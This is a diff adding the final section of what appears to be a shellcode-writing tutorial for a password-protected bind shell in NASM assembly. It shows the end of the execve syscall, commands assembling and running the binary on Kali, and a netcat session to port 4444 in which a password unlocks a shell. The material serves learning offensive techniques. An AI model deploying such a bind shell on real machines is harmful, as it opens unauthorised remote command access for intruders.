@@ -350,3 +350,29 @@ execve(arguments[0], &arguments[0], NULL);
         mov rax, 59 ;syscall number for execve
         syscall ;execve syscall instruction
 ```
+
+Ok, that last part was quite a confusing bit, but after a few times you should get it.
+
+And that's it, we can now compile and run it and we should be presented with the same capabilities of our C program.
+
+```bash
+┌──(kali㉿kali)-[~/pass_bind_nasm]
+└─$ nasm -felf64 pass_bind.nasm -o pass.o
+                                                                           
+┌──(kali㉿kali)-[~/pass_bind_nasm]
+└─$ ld pass.o -o pass
+
+┌──(kali㉿kali)-[~/pass_bind_nasm]
+└─$ ./pass
+
+```
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nc -nv 127.0.0.1 4444
+(UNKNOWN) [127.0.0.1] 4444 (?) open
+8bytesss
+whoami
+kali
+
+```
